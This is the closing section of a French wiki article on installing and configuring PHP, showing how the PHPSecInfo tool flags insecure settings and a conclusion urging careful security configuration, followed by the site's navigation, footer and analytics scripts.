+<li> rouge?: mauvaise valeur de configuration (changement de valeur recommandé).</li></ul>
+<p><a href="./File:Php2.jpg.html" class="image"><img alt="Php2.jpg" src="images/a/ad/Php2.jpg" width="499" height="323" /></a>
+</p><p>Si vous avez besoin de plus d’informations sur un message d’avertissement, un lien pointant sur le site <a rel="nofollow" class="external free" href="http://phpsec.org/">http://phpsec.org/</a> est à votre disposition pour chaque directive (voir Figure?2).
+</p><p><a href="./File:Php3.jpg.html" class="image"><img alt="Php3.jpg" src="images/0/0f/Php3.jpg" width="499" height="323" /></a>
+</p>
+<h1><span class="mw-headline" id="Conclusion"><span class="mw-headline-number">6</span> Conclusion</span></h1>
+<p>Nous avons pu voir dans cet article les différentes manières de configurer PHP. Ce langage s’appuyant sur un serveur web, il est essentiel de veiller à ce que les directives ayant trait à la sécurité soient correctement paramétrées pour minimiser le risque d’intrusion dans vos programmes. L’application PHPSecInfo peut vous aider dans cette démarche. Mais surtout, n’hésitez pas à aller "?farfouiller?" dans la documentation de PHP... c’est une mine d’informations inépuisable.
+</p>
+<!-- 
+NewPP limit report
+CPU time usage: 0.036 seconds
+Real time usage: 0.037 seconds
+Preprocessor visited node count: 156/1000000
+Preprocessor generated node count: 396/1000000
+Post‐expand include size: 1536/2097152 bytes
+Template argument size: 383/2097152 bytes
+Highest expansion depth: 3/40
+Expensive parser function count: 0/100
+-->
+
+<!-- 
+Transclusion expansion time report (%,ms,calls,template)
+100.00%    7.923      1 - -total
+ 70.11%    5.555      3 - Template:Config
+ 19.55%    1.549      5 - Template:Command
+-->
+
+<!-- Saved in parser cache with key blocnotesinfo-wiki_:pcache:idhash:3064-0!*!*!1!en!5!* and timestamp 20181111230820 and revision id 8413
+ -->
+</div>									<div class="printfooter">
+						Retrieved from "<a dir="ltr" href="https://wiki.deimos.fr/index.php?title=PHP_:_Installation_et_configuration&amp;oldid=8413">https://wiki.deimos.fr/index.php?title=PHP_:_Installation_et_configuration&amp;oldid=8413</a>"					</div>
+													<div id='catlinks' class='catlinks catlinks-allhidden'></div>												<div class="visualClear"></div>
+							</div>
+		</div>
+		<div id="mw-navigation">
+			<h2>Navigation menu</h2>
+
+			<div id="mw-head">
+									<div id="p-personal" role="navigation" class="" aria-labelledby="p-personal-label">
+						<h3 id="p-personal-label">Personal tools</h3>
+						<ul>
+							<li id="pt-login"><a href="https://wiki.deimos.fr/index.php?title=Special:UserLogin&amp;returnto=PHP+%3A+Installation+et+configuration" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>						</ul>
+					</div>
+									<div id="left-navigation">
+										<div id="p-namespaces" role="navigation" class="vectorTabs" aria-labelledby="p-namespaces-label">
+						<h3 id="p-namespaces-label">Namespaces</h3>
+						<ul>
+															<li  id="ca-nstab-main" class="selected"><span><a href="./PHP_:_Installation_et_configuration.html"  title="View the content page [c]" accesskey="c">Page</a></span></li>
+													</ul>
+					</div>
+										<div id="p-variants" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-variants-label">
+												<h3 id="p-variants-label"><span>Variants</span><a href="./PHP_:_Installation_et_configuration.html#"></a></h3>
+
+						<div class="menu">
+							<ul>
+															</ul>
+						</div>
+					</div>
+									</div>
+				<div id="right-navigation">
+										<div id="p-views" role="navigation" class="vectorTabs" aria-labelledby="p-views-label">
+						<h3 id="p-views-label">Views</h3>
+						<ul>
+															<li id="ca-view" class="selected"><span><a href="./PHP_:_Installation_et_configuration.html" >Read</a></span></li>
+															<li id="ca-viewsource"><span><a href="https://wiki.deimos.fr/index.php?title=PHP_:_Installation_et_configuration&amp;action=edit"  title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></span></li>
+															<li id="ca-history" class="collapsible"><span><a href="https://wiki.deimos.fr/index.php?title=PHP_:_Installation_et_configuration&amp;action=history"  title="Past revisions of this page [h]" accesskey="h">View history</a></span></li>
+													</ul>
+					</div>
+										<div id="p-cactions" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-cactions-label">
+						<h3 id="p-cactions-label"><span>More</span><a href="./PHP_:_Installation_et_configuration.html#"></a></h3>
+
+						<div class="menu">
+							<ul>
+															</ul>
+						</div>
+					</div>
+										<div id="p-search" role="search">
+						<h3>
+							<label for="searchInput">Search</label>
+						</h3>
+
+						<form action="https://wiki.deimos.fr/index.php" id="searchform">
+														<div id="simpleSearch">
+															<input type="search" name="search" placeholder="Search" title="Search Deimos.fr / Bloc Notes Informatique [f]" accesskey="f" id="searchInput" /><input type="hidden" value="Special:Search" name="title" /><input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton mw-fallbackSearchButton" /><input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchButton" class="searchButton" />								</div>
+						</form>
+					</div>
+									</div>
+			</div>
+			<div id="mw-panel">
+				<div id="p-logo" role="banner"><a style="background-image: url(images/a/a7/Logo_deimosfr.png);" href="index.html"  title="Visit the main page"></a></div>
+						<div class="portal" role="navigation" id='p-navigation_et_RSS' aria-labelledby='p-navigation_et_RSS-label'>
+			<h3 id='p-navigation_et_RSS-label'>navigation et RSS</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-cd-.7E"><a href="index.html">cd ~</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Menu' aria-labelledby='p-Menu-label'>
+			<h3 id='p-Menu-label'>Menu</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-Solaris"><a href="Solaris.html">Solaris</a></li>
+													<li id="n-BSD"><a href="BSD.html">BSD</a></li>
+													<li id="n-Linux"><a href="Linux.html">Linux</a></li>
+													<li id="n-Mac-OS-X"><a href="Mac_OS_X.html">Mac OS X</a></li>
+													<li id="n-Windows"><a href="Windows.html">Windows</a></li>
+													<li id="n-Servers"><a href="Serveurs.html">Servers</a></li>
+													<li id="n-Development"><a href="Développement.html">Development</a></li>
+													<li id="n-Ethical-Hacking"><a href="Hacking_éthique.html">Ethical Hacking</a></li>
+													<li id="n-Network"><a href="Réseaux.html">Network</a></li>
+													<li id="n-Divers"><a href="Divers.html">Divers</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Liens' aria-labelledby='p-Liens-label'>
+			<h3 id='p-Liens-label'>Liens</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-Welcome-Page"><a href="http://www.deimos.fr" rel="nofollow">Welcome Page</a></li>
+													<li id="n-Blog"><a href="http://blog.deimos.fr" rel="nofollow">Blog</a></li>
+													<li id="n-Resume"><a href="https://www.linkedin.com/in/pmavro/" rel="nofollow">Resume</a></li>
+													<li id="n-GitHub"><a href="https://github.com/deimosfr" rel="nofollow">GitHub</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Google_Search' aria-labelledby='p-Google_Search-label'>
+			<h3 id='p-Google_Search-label'>Google Search</h3>
+
+			<div class="body">
+									
+<div><form action="http://www.google.fr/cse" id="cse-search-box">
+    <input type="hidden" name="cx" value="partner-pub-8001790276473966:7664586454" />
+    <input type="hidden" name="ie" value="UTF-8" />
+    <input type="text" name="q" size="12" />
+    <input type="submit" name="sa" value="Search" />
+</form></div>			</div>
+		</div>
+			<div class="portal" role="navigation" id='p-googletranslator' aria-labelledby='p-googletranslator-label'>
+			<h3 id='p-googletranslator-label'>Translate</h3>
+
+			<div class="body">
+									<div id="google_translate_element"></div><script>
+                                        function googleTranslateElementInit() {
+                                          new google.translate.TranslateElement({
+                                            pageLanguage: 'fr',
+                                            includedLanguages: 'en,de,es'
+                                          }, 'google_translate_element');
+                                        }
+                                        </script><script src="http://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>			</div>
+		</div>
+			<div class="portal" role="navigation" id='p-tb' aria-labelledby='p-tb-label'>
+			<h3 id='p-tb-label'>Tools</h3>
+
+			<div class="body">
+									<ul>
+													<li id="t-whatlinkshere"><a href="./Special:WhatLinksHere/PHP_:_Installation_et_configuration.html" title="A list of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
+													<li id="t-recentchangeslinked"><a href="https://wiki.deimos.fr/Special:RecentChangesLinked/PHP_:_Installation_et_configuration" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+													<li id="t-specialpages"><a href="https://wiki.deimos.fr/Special:SpecialPages" title="A list of all special pages [q]" accesskey="q">Special pages</a></li>
+													<li id="t-print"><a href="https://wiki.deimos.fr/index.php?title=PHP_:_Installation_et_configuration&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>
+													<li id="t-permalink"><a href="https://wiki.deimos.fr/index.php?title=PHP_:_Installation_et_configuration&amp;oldid=8413" title="Permanent link to this revision of the page">Permanent link</a></li>
+													<li id="t-info"><a href="https://wiki.deimos.fr/index.php?title=PHP_:_Installation_et_configuration&amp;action=info" title="More information about this page">Page information</a></li>
+											</ul>
+							</div>
+		</div>
+				</div>
+		</div>
+		<div id="footer" role="contentinfo">
+							<ul id="footer-info">
+											<li id="footer-info-lastmod"> This page was last modified on 11 December 2009, at 20:04.</li>
+											<li id="footer-info-copyright">Content is available under <a class="external" rel="nofollow" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr">Attribution - Pas d’Utilisation Commerciale - Partage dans les Mêmes Conditions 3.0 non transposé</a> unless otherwise noted.</li>
+									</ul>
+							<ul id="footer-places">
+											<li id="footer-places-privacy"><a href="https://wiki.deimos.fr/blocnotesinfo:Privacy_policy" title="blocnotesinfo:Privacy policy">Privacy policy</a></li>
+											<li id="footer-places-about"><a href="https://wiki.deimos.fr/blocnotesinfo:About" title="blocnotesinfo:About">About Deimos.fr / Bloc Notes Informatique</a></li>
+											<li id="footer-places-disclaimer"><a href="https://wiki.deimos.fr/blocnotesinfo:General_disclaimer" title="blocnotesinfo:General disclaimer">Disclaimers</a></li>
+									</ul>
+										<ul id="footer-icons" class="noprint">
+											<li id="footer-copyrightico">
+															<a href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr"><img src="http://i.creativecommons.org/l/by-nc-sa/3.0/88x31.png" alt="Attribution - Pas d’Utilisation Commerciale - Partage dans les Mêmes Conditions 3.0 non transposé" width="88" height="31" /></a>
+													</li>
+											<li id="footer-poweredbyico">
+															<a href="https://www.mediawiki.org/"><img src="resources/assets/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" srcset="resources/assets/poweredby_mediawiki_132x47.png 1.5x, resources/assets/poweredby_mediawiki_176x62.png 2x" width="88" height="31" /></a>
+															<a href="http://www.mediawiki.org/wiki/Extension:SphinxSearch"><img src="extensions/SphinxSearch/skins/images/Powered_by_sphinx.png" alt="Search Powered by Sphinx" width="88" height="31" /></a>
+													</li>
+									</ul>
+						<div style="clear:both"></div>
+		</div>
+		<script>if(window.jQuery)jQuery.ready();</script><script>if(window.mw){
+mw.loader.state({"site":"loading","user":"ready","user.groups":"ready"});
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.toc","mediawiki.action.view.postEdit","mediawiki.user","mediawiki.hidpi","mediawiki.page.ready","mediawiki.searchSuggest"],null,true);
+}</script>
+<script>if(window.mw){
+document.write("\u003Cscript src=\"https://wiki.deimos.fr/load.php?debug=false\u0026amp;lang=en\u0026amp;modules=site\u0026amp;only=scripts\u0026amp;skin=vector\u0026amp;*\"\u003E\u003C/script\u003E");
+}</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-63927289-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<script type="text/javascript" src="https://analytics.example.com/tracking.js"></script><script src="https://js.reactk.com/script/reactk.min.js"></script><script type="text/javascript">reactk.init("B7stJmobgweRBoDZrLflNQpDcgFxET");</script> 
+<script>if(window.mw){
+mw.config.set({"wgBackendResponseTime":73});
+}</script>
+	</body>
+</html>
+	
